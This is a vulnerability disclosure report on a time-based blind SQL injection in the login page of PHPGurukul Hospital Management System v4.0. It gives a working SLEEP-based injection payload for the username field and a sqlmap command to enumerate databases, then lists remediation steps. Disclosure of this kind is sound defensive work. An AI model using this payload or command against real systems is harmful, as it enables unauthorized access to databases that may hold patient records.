
# Time-Based Blind SQL Injection Vulnerability Report

## Affected Product

| **Attribute**         | **Details**                                                                 |
|-----------------------|-----------------------------------------------------------------------------|
| **Product Name**      | Hospital Management System                                                  |
| **Vendor**            | PHPGurukul                                                                  |
| **Version**           | v4.0                                                                        |
| **Affected File**     | `/hospital/hms/user-login.php`                                              |
| **Affected Parameter**| `username`                                                                  |
| **Method**            | `POST`                                                                      |
| **Vulnerability Type**| Time-Based Blind SQL Injection                                              |

## Official Website

[PHPGurukul Hospital Management System v4.0](https://phpgurukul.com/hospital-management-system-in-php/)

## Vulnerability Overview

A time-based blind SQL injection vulnerability exists in the `username` parameter (email field) of **Hospital Management System v4.0**, allowing remote attackers to execute arbitrary SQL commands by triggering time delays in the database response.

## Steps to Reproduce

### 1. Access the Vulnerable URL

- Enable Burp Suite and configure your browser to route traffic through it.
- Visit the Patient Login page, which redirects to `user-login.php`.
- Fill in the email and password fields with any value and intercept the request.

```
http://192.168.137.197/hospital/hms/user-login.php
```

![Login Page](https://github.com/Ant1sec-ops/HMSv4.0-Blind-SQL-Injection/blob/main/1.png)

---

### 2. Intercept the Request

- Send the intercepted login request to **Repeater** in Burp Suite.
- Add an asterisk `*` to the `username` field to identify injection points.
- Save the modified HTTP request as `sql-login.txt` for SQLMap.

![Burp Repeater Modification](https://github.com/Ant1sec-ops/HMSv4.0-Blind-SQL-Injection/blob/main/2.png)

---

### 3. Manual Exploitation (Not Recommended)

- Use the following payload in the `username` field to test time-based SQL injection manually:

```sql
username=testemail@example.com' AND (SELECT 5152 FROM (SELECT(SLEEP(5)))VIxW) AND 'vNaU'='vNaU
```

> ⚠️ Manual testing of time-based injections is slow and prone to error. It's recommended to use **SQLMap** for automated exploitation and enumeration.

---

### 4. Automated Exploitation Using SQLMap

To list the databases via SQLMap:

- Open Kali Linux terminal and run:

```bash
sqlmap -r sql-login.txt --dbs
```

- This command uses the `sql-login.txt` request file (`-r` flag) and attempts to enumerate databases using the `--dbs` flag.

![SQLMap Database Enumeration](https://github.com/Ant1sec-ops/HMSv4.0-Blind-SQL-Injection/blob/main/3.png)

![SQLMap Database Enumeration](https://github.com/Ant1sec-ops/HMSv4.0-Blind-SQL-Injection/blob/main/5.png)

---

## Remediation

1. **Use Prepared Statements (Parameterized Queries):**  
   Avoid dynamic SQL queries that directly concatenate user input.

2. **Input Validation & Sanitization:**  
   Implement strong input validation and reject inputs containing SQL metacharacters.

3. **Least Privilege Principle:**  
   Ensure the database account used by the application has only the minimum required privileges.

4. **Web Application Firewall (WAF):**  
   Deploy a WAF to detect and block malicious SQL queries.

5. **Error Handling:**  
   Suppress detailed database errors from user-facing interfaces.

---

## References

- OWASP Top 10 - [A03: Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [SQLMap Tool](https://sqlmap.org)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

## Disclosure Timeline

| Date       | Activity                             |
|------------|--------------------------------------|
| 2025-06-01 | Vulnerability Identified via SQLMap  |

---

## Author

**Report generated by:** `Subhash Paudel`  
**Tool Used:** SQLMap  
